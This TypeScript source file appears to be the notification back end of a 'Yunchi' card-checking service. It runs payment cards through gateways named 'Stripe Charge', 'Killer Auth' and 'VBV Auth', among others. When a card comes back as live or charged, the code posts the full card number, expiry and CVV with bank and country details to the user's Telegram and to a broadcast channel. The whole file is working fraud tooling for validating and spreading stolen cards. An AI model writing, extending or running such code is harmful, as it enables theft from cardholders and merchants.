import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";
const LIVE_CARDS_CHANNEL_ID = "-1003762273256"; // Channel for broadcasting all live/charged cards
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TENOR_API_KEY = Deno.env.get("TENOR_API_KEY");

interface BinInfo {
  brand: string;
  type: string;
  level: string;
  bank: string;
  country: string;
  countryCode: string;
}

interface ChargedCardRequest {
  user_id: string;
  card_details: string; // Format: cardnum|mm|yy|cvv
  status: "CHARGED" | "DECLINED" | "UNKNOWN";
  response_message: string;
  amount: string;
  gateway: string;
  api_response?: string; // Raw API response for debugging
  screenshot_url?: string; // Screenshot URL from API if available
}

// Get country flag emoji from country code
function getCountryFlag(countryCode: string): string {
  if (!countryCode || countryCode === 'XX' || countryCode.length !== 2) {
    return '🌍';
  }
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

// Get card brand emoji
function getBrandEmoji(brand: string): string {
  const brandEmojis: Record<string, string> = {
    'VISA': '💳',
    'MASTERCARD': '💳',
    'AMEX': '💎',
    'AMERICAN EXPRESS': '💎',
    'DISCOVER': '🔍',
    'JCB': '🎌',
    'UNIONPAY': '🇨🇳',
    'DINERS CLUB': '🍽️',
    'MAESTRO': '🎵',
  };
  return brandEmojis[brand?.toUpperCase()] || '💳';
}

// Lookup BIN information
async function lookupBin(bin: string): Promise<BinInfo> {
  const defaultInfo: BinInfo = {
    brand: "Unknown",
    type: "Unknown",
    level: "Standard",
    bank: "Unknown Bank",
    country: "Unknown",
    countryCode: "XX",
  };

  try {
    const response = await fetch(`https://lookup.binlist.net/${bin.slice(0, 8)}`, {
      headers: { 'Accept-Version': '3' },
    });

    if (response.ok) {
      const data = await response.json();
      return {
        brand: data.scheme?.toUpperCase() || "Unknown",
        type: data.type?.charAt(0).toUpperCase() + data.type?.slice(1) || "Unknown",
        level: data.brand || "Standard",
        bank: data.bank?.name || "Unknown Bank",
        country: data.country?.name || "Unknown",
        countryCode: data.country?.alpha2 || "XX",
      };
    }
  } catch (error) {
    console.error("BIN lookup error:", error);
  }

// Fallback detection
  if (/^4/.test(bin)) {
    defaultInfo.brand = "VISA";
  } else if (/^5[1-5]/.test(bin) || /^2[2-7]/.test(bin)) {
    defaultInfo.brand = "MASTERCARD";
  } else if (/^3[47]/.test(bin)) {
    defaultInfo.brand = "AMEX";
  } else if (/^6(?:011|5|4[4-9]|22)/.test(bin)) {
    defaultInfo.brand = "DISCOVER";
  }

  return defaultInfo;
}

// ========== ENTITY-BASED MESSAGE BUILDER ==========
interface TelegramEntity {
  type: string;
  offset: number;
  length: number;
  custom_emoji_id?: string;
}

// Calculate UTF-16 length (Telegram Bot API uses UTF-16 offsets)
function utf16Length(str: string): number {
  let len = 0;
  for (const char of str) {
    len += char.codePointAt(0)! > 0xFFFF ? 2 : 1;
  }
  return len;
}

// Parse message: strip <code> HTML tags → code entities, ✅ → custom_emoji entities
function parseMessageEntities(text: string): { plainText: string; entities: TelegramEntity[] } {
  const entities: TelegramEntity[] = [];
  let plainText = '';
  let i = 0;

  // Strip <code>...</code> tags and record as code entities
  while (i < text.length) {
    if (text.startsWith('<code>', i)) {
      const closeIdx = text.indexOf('</code>', i + 6);
      if (closeIdx !== -1) {
        const content = text.slice(i + 6, closeIdx);
        const offset = utf16Length(plainText);
        entities.push({ type: 'code', offset, length: utf16Length(content) });
        plainText += content;
        i = closeIdx + 7;
        continue;
      }
    }
    plainText += text[i];
    i++;
  }

  // Find all ✅ characters and add custom_emoji entities
  let utf16Offset = 0;
  for (const char of plainText) {
    if (char === '✅') {
      entities.push({
        type: 'custom_emoji',
        offset: utf16Offset,
        length: 1, // ✅ U+2705 is 1 UTF-16 unit
        custom_emoji_id: '5336985409220001678',
      });
    }
    utf16Offset += char.codePointAt(0)! > 0xFFFF ? 2 : 1;
  }

  // Sort entities by offset
  entities.sort((a, b) => a.offset - b.offset);

  return { plainText, entities };
}

// Fallback anime GIFs in case Tenor API fails
const FALLBACK_GIFS = [
  "https://media.giphy.com/media/Ju8RiMNjR7TJS/giphy.gif", // Goku power up
  "https://media.giphy.com/media/vxvNnSOyPIbKM/giphy.gif", // Goku Super Saiyan
  "https://media.giphy.com/media/dxld1UBIiGuoh31Fus/giphy.gif", // Itachi Uchiha
  "https://media.giphy.com/media/ohT1vVoz1lWXEMoGzM/giphy.gif", // Naruto victory
];

// Fetch random anime GIF from Tenor API
async function getRandomAnimeGif(): Promise<string> {
  if (!TENOR_API_KEY) {
    console.log("Tenor API key not configured, using fallback GIF");
    return FALLBACK_GIFS[Math.floor(Math.random() * FALLBACK_GIFS.length)];
  }

  try {
    // Search for anime GIFs
    const searchTerms = ["anime celebration", "anime victory", "anime happy", "anime excited", "anime power up"];
    const randomTerm = searchTerms[Math.floor(Math.random() * searchTerms.length)];
    
    const url = `https://tenor.googleapis.com/v2/search?q=${encodeURIComponent(randomTerm)}&key=${TENOR_API_KEY}&limit=50&media_filter=gif`;
    
    const response = await fetch(url);
    
    if (!response.ok) {
      console.error("Tenor API error:", response.status);
      return FALLBACK_GIFS[Math.floor(Math.random() * FALLBACK_GIFS.length)];
    }

    const data = await response.json();
    
    if (data.results && data.results.length > 0) {
      // Pick a random GIF from results
      const randomIndex = Math.floor(Math.random() * data.results.length);
      const gif = data.results[randomIndex];
      
      // Get the GIF URL (prefer smaller size for faster loading)
      const gifUrl = gif.media_formats?.gif?.url || 
                     gif.media_formats?.tinygif?.url ||
                     gif.media_formats?.nanogif?.url;
      
      if (gifUrl) {
        console.log("Fetched random anime GIF from Tenor:", gifUrl);
        return gifUrl;
      }
    }

    console.log("No GIFs found from Tenor, using fallback");
    return FALLBACK_GIFS[Math.floor(Math.random() * FALLBACK_GIFS.length)];
  } catch (error) {
    console.error("Error fetching from Tenor API:", error);
    return FALLBACK_GIFS[Math.floor(Math.random() * FALLBACK_GIFS.length)];
  }
}

// Send Telegram animation with caption (entities-based, no parse_mode)
async function sendTelegramAnimation(chatId: string, gifUrl: string, caption: string, captionEntities?: TelegramEntity[]): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log("Telegram bot token not configured");
    return false;
  }

  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      animation: gifUrl,
    };

    if (captionEntities && captionEntities.length > 0) {
      body.caption = caption;
      body.caption_entities = captionEntities;
    } else {
      body.caption = caption;
      body.parse_mode = "HTML";
    }

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAnimation`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram API error:", errorData);
      return await sendTelegramMessage(chatId, caption, captionEntities);
    }

    console.log("Telegram animation sent successfully to:", chatId);
    return true;
  } catch (error) {
    console.error("Error sending Telegram animation:", error);
    return await sendTelegramMessage(chatId, caption, captionEntities);
  }
}

// Send Telegram message (fallback, entities-based)
async function sendTelegramMessage(chatId: string, message: string, messageEntities?: TelegramEntity[]): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log("Telegram bot token not configured");
    return false;
  }

  try {
    const body: Record<string, unknown> = {
      chat_id: chatId,
      text: message,
    };

    if (messageEntities && messageEntities.length > 0) {
      body.entities = messageEntities;
    } else {
      body.parse_mode = "HTML";
    }

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      }
    );

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram API error:", errorData);
      return false;
    }

    console.log("Telegram notification sent successfully to:", chatId);
    return true;
  } catch (error) {
    console.error("Error sending Telegram message:", error);
    return false;
  }
}

// Send Telegram photo with caption
async function sendTelegramPhoto(chatId: string, photoUrl: string, caption: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log("Telegram bot token not configured");
    return false;
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          photo: photoUrl,
          caption: caption,
          parse_mode: "HTML",
        }),
      }
    );

    if (!response.ok) {
      const errorData = await response.json();
      console.error("Telegram photo API error:", errorData);
      // Fallback to text message if photo fails
      return await sendTelegramMessage(chatId, caption);
    }

    console.log("Telegram photo sent successfully to:", chatId);
    return true;
  } catch (error) {
    console.error("Error sending Telegram photo:", error);
    // Fallback to text message
    return await sendTelegramMessage(chatId, caption);
  }
}

// Generate SHA-256 hash for card deduplication
async function hashCard(cardDetails: string, gateway: string): Promise<string> {
  const data = new TextEncoder().encode(`${cardDetails}|${gateway}`);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const requestData: ChargedCardRequest = await req.json();
    const { user_id, card_details, status, response_message, amount, gateway, api_response, screenshot_url } = requestData;

    console.log("[NOTIFY-CHARGED] Processing notification:", { user_id, status, gateway });

    if (!user_id || !card_details || !status) {
      return new Response(
        JSON.stringify({ error: 'Missing required fields' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Initialize Supabase client
    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    // Handle UNKNOWN status - Skip notification
    if (status === "UNKNOWN") {
      console.log("[NOTIFY-CHARGED] UNKNOWN status - skipping user notification");
      return new Response(
        JSON.stringify({ success: true, type: 'unknown_skipped' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // DECLINED cards - Skip user notification entirely
    if (status === "DECLINED") {
      console.log("[NOTIFY-CHARGED] DECLINED status - skipping user notification");
      return new Response(
        JSON.stringify({ success: true, type: 'declined_skipped' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // ========== DEDUPLICATION CHECK (skipped for CHARGED results) ==========
    const isChargedResult = status === "CHARGED";
    
    if (!isChargedResult) {
      const cardHash = await hashCard(card_details, gateway);
      const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
      
      const { data: existingBroadcast } = await supabase
        .from('broadcasted_cards')
        .select('id')
        .eq('card_hash', cardHash)
        .gte('created_at', twentyFourHoursAgo)
        .limit(1);
      
      if (existingBroadcast && existingBroadcast.length > 0) {
        console.log("[NOTIFY-CHARGED] Duplicate card detected - skipping notification (hash:", cardHash.slice(0, 8), "...)");
        return new Response(
          JSON.stringify({ success: true, type: 'duplicate_skipped', hash: cardHash.slice(0, 8) }),
          { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
      }

      await supabase
        .from('broadcasted_cards')
        .insert({ card_hash: cardHash, user_id: user_id, gateway: gateway });
      
      console.log("[NOTIFY-CHARGED] Card recorded for dedup (hash:", cardHash.slice(0, 8), "...)");
    } else {
      console.log("[NOTIFY-CHARGED] CHARGED result - skipping dedup, always notify");
    }
    // ========== END DEDUPLICATION CHECK ==========

    // Get user's Telegram chat ID and username
    const { data: profile, error: profileError } = await supabase
      .from('profiles')
      .select('telegram_chat_id, username')
      .eq('user_id', user_id)
      .single();

    // Parse card details
    const [cardNum, mm, yy, cvv] = card_details.split('|');
    const bin = cardNum?.slice(0, 6) || '';
    const last4 = cardNum?.slice(-4) || '****';

    // Lookup BIN information
    const binInfo = await lookupBin(bin);
    const countryFlag = getCountryFlag(binInfo.countryCode);
    const brandEmoji = getBrandEmoji(binInfo.brand);

    // Full card for admin debug (LIVE cards show full details)
    const fullCardForAdmin = `${cardNum}|${mm}|${yy}|${cvv}`;

    // Only CHARGED/LIVE cards reach here - notify user if they have Telegram linked
    if (profileError || !profile?.telegram_chat_id) {
      console.log("User has no Telegram chat ID linked:", user_id);
      return new Response(
        JSON.stringify({ success: false, reason: 'No Telegram linked' }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Build fancy notification with Unicode fonts
    const timeNow = new Date().toISOString().replace('T', ' ').slice(0, 16);
    const randomGif = await getRandomAnimeGif();
    
    // Fancy Unicode text converters
    const toFancyBold = (text: string) => {
      const chars: Record<string, string> = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
      };
      return text.split('').map(c => chars[c] || c).join('');
    };

    const toFancyItalic = (text: string) => {
      const chars: Record<string, string> = {
        'A': '𝘈', 'B': '𝘉', 'C': '𝘊', 'D': '𝘋', 'E': '𝘌', 'F': '𝘍', 'G': '𝘎', 'H': '𝘏', 'I': '𝘐',
        'J': '𝘑', 'K': '𝘒', 'L': '𝘓', 'M': '𝘔', 'N': '𝘕', 'O': '𝘖', 'P': '𝘗', 'Q': '𝘘', 'R': '𝘙',
        'S': '𝘚', 'T': '𝘛', 'U': '𝘜', 'V': '𝘝', 'W': '𝘞', 'X': '𝘟', 'Y': '𝘠', 'Z': '𝘡',
        'a': '𝘢', 'b': '𝘣', 'c': '𝘤', 'd': '𝘥', 'e': '𝘦', 'f': '𝘧', 'g': '𝘨', 'h': '𝘩', 'i': '𝘪',
        'j': '𝘫', 'k': '𝘬', 'l': '𝘭', 'm': '𝘮', 'n': '𝘯', 'o': '𝘰', 'p': '𝘱', 'q': '𝘲', 'r': '𝘳',
        's': '𝘴', 't': '𝘵', 'u': '𝘶', 'v': '𝘷', 'w': '𝘸', 'x': '𝘹', 'y': '𝘺', 'z': '𝘻'
      };
      return text.split('').map(c => chars[c] || c).join('');
    };

    const toFancyScript = (text: string) => {
      const chars: Record<string, string> = {
        'A': '𝒜', 'B': '𝐵', 'C': '𝒞', 'D': '𝒟', 'E': '𝐸', 'F': '𝐹', 'G': '𝒢', 'H': '𝐻', 'I': '𝐼',
        'J': '𝒥', 'K': '𝒦', 'L': '𝐿', 'M': '𝑀', 'N': '𝒩', 'O': '𝒪', 'P': '𝒫', 'Q': '𝒬', 'R': '𝑅',
        'S': '𝒮', 'T': '𝒯', 'U': '𝒰', 'V': '𝒱', 'W': '𝒲', 'X': '𝒳', 'Y': '𝒴', 'Z': '𝒵',
        'a': '𝒶', 'b': '𝒷', 'c': '𝒸', 'd': '𝒹', 'e': '𝑒', 'f': '𝒻', 'g': '𝑔', 'h': '𝒽', 'i': '𝒾',
        'j': '𝒿', 'k': '𝓀', 'l': '𝓁', 'm': '𝓂', 'n': '𝓃', 'o': '𝑜', 'p': '𝓅', 'q': '𝓆', 'r': '𝓇',
        's': '𝓈', 't': '𝓉', 'u': '𝓊', 'v': '𝓋', 'w': '𝓌', 'x': '𝓍', 'y': '𝓎', 'z': '𝓏'
      };
      return text.split('').map(c => chars[c] || c).join('');
    };
    
    // Map edge function names to user-facing gateway names
    const GATEWAY_DISPLAY_NAMES: Record<string, string> = {
      'Chaos-auth-check': 'Yunchi 1',
      'Chao-auth-check': 'Yunchi 1',
      'adyenn-auth-check': 'Yunchi 2',
      'appbased-check': 'Yunchi 3',
      'Killer Auth': 'Killer Auth',
      'Yunchi VBV Auth': 'Yunchi VBV Auth',
      'Stripe Charge': 'Stripe Charge',
      'Stripe Charge Low': 'Stripe Charge Low',
      'PayPal Charge': 'PayPal Charge',
      'AuthNet Charge': 'AuthNet Charge',
      'RazorPay Charge': 'RazorPay Charge',
      'PayU Charge': 'PayU Charge',
      'Shopify Charge': 'Shopify Charge',
      'PayPal GraphQL': 'PayPal GraphQL',
      'PayPal Woo': 'PayPal Woo',
    };
    const displayGateway = GATEWAY_DISPLAY_NAMES[gateway] || gateway;

    // Determine gateway type for status display
    const isVbvGateway = gateway.toLowerCase().includes('vbv');
    const isKillerGateway = gateway.toLowerCase().includes('killer');
    const isChargeGateway = gateway.toLowerCase().includes('payu') || 
                            gateway.toLowerCase().includes('paygate') ||
                            gateway.toLowerCase().includes('charge') ||
                            gateway.toLowerCase().includes('pwgate') ||
                            gateway.toLowerCase().includes('rizzup');
    
    // Killer → KILLED, VBV → PASSED, Charge → CHARGED, Auth → LIVE
    const statusLabel = isKillerGateway ? 'KILLED' : (isVbvGateway ? 'PASSED' : (isChargeGateway ? 'CHARGED' : 'LIVE'));
    // Use plain ✅ - it will be replaced with custom_emoji entity by parseMessageEntities()
    const statusLine = isKillerGateway
      ? `✅ ${toFancyBold('KILLED')}`
      : isVbvGateway
        ? `✅ ${toFancyBold('PASSED')}`
        : isChargeGateway
          ? `✅ ${toFancyBold('CHARGED')} • 💰 ${amount}`
          : `✅ ${toFancyBold('LIVE')}`;
    
    // 🔥 Show FULL card details for LIVE/CHARGED cards (user's card, they need full info)
    const fullCard = `${cardNum}|${mm}|${yy}|${cvv}`;
    
    const message = `🔥 ${toFancyBold(statusLabel + ' CARD FOUND')} 🔥

${toFancyScript('Card')} ▸ <code>${fullCard}</code>

${statusLine}
${toFancyScript('Response')} ▸ ${(response_message || '').toUpperCase().includes('ORDER_PLACED') || (response_message || '').toUpperCase().includes('ORDER PLACED') ? '💎 ORDER PLACED' : `<code>${response_message}</code>`}

${brandEmoji} ${toFancyItalic(binInfo.brand)} • ${toFancyItalic(binInfo.type)}
🏦 ${binInfo.bank}
⭐ ${binInfo.level} • ${countryFlag} ${binInfo.country}

⚡ ${gateway} • 🕐 ${timeNow}

${toFancyScript('Yunchi')} ⚡`.trim();

    // Build channel broadcast message with FULL details and BIN info
    const username = profile.username || 'Anonymous';
    
    
    const channelMessage = `🔥 ${toFancyBold(statusLabel + ' CARD')} 🔥

${toFancyScript('Card')} ▸ <code>${fullCard}</code>

${statusLine}

━━━━━━ 𝗕𝗜𝗡 𝗜𝗡𝗙𝗢 ━━━━━━
${brandEmoji} ${toFancyBold('Brand')}: ${binInfo.brand}
💳 ${toFancyBold('Type')}: ${binInfo.type}
⭐ ${toFancyBold('Level')}: ${binInfo.level}
🏦 ${toFancyBold('Bank')}: ${binInfo.bank}
${countryFlag} ${toFancyBold('Country')}: ${binInfo.country}
━━━━━━━━━━━━━━━━━━━━

⚡ ${gateway} • 👤 @${username}
🕐 ${timeNow}

${toFancyScript('Yunchi')} ⚡`.trim();

    // Parse messages into plain text + entities (custom emoji + code blocks)
    const parsedUserMsg = parseMessageEntities(message);
    const parsedChannelMsg = parseMessageEntities(channelMessage);

    // Send notification to user with full card details and random anime GIF
    const sentToUser = await sendTelegramAnimation(profile.telegram_chat_id, randomGif, parsedUserMsg.plainText, parsedUserMsg.entities);
    
    // Broadcast ALL live/charged cards to channel (no exclusions)
    const channelGif = await getRandomAnimeGif();
    
    console.log("[NOTIFY-CHARGED] Broadcasting to channel:", LIVE_CARDS_CHANNEL_ID, "Gateway:", gateway);
    const sentToChannel = await sendTelegramAnimation(LIVE_CARDS_CHANNEL_ID, channelGif, parsedChannelMsg.plainText, parsedChannelMsg.entities);

    return new Response(
      JSON.stringify({ 
        success: sentToUser, 
        channelBroadcast: sentToChannel,
        channel: LIVE_CARDS_CHANNEL_ID 
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    console.error('[NOTIFY-CHARGED] Error:', errorMessage);
    
    return new Response(
      JSON.stringify({ error: errorMessage }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
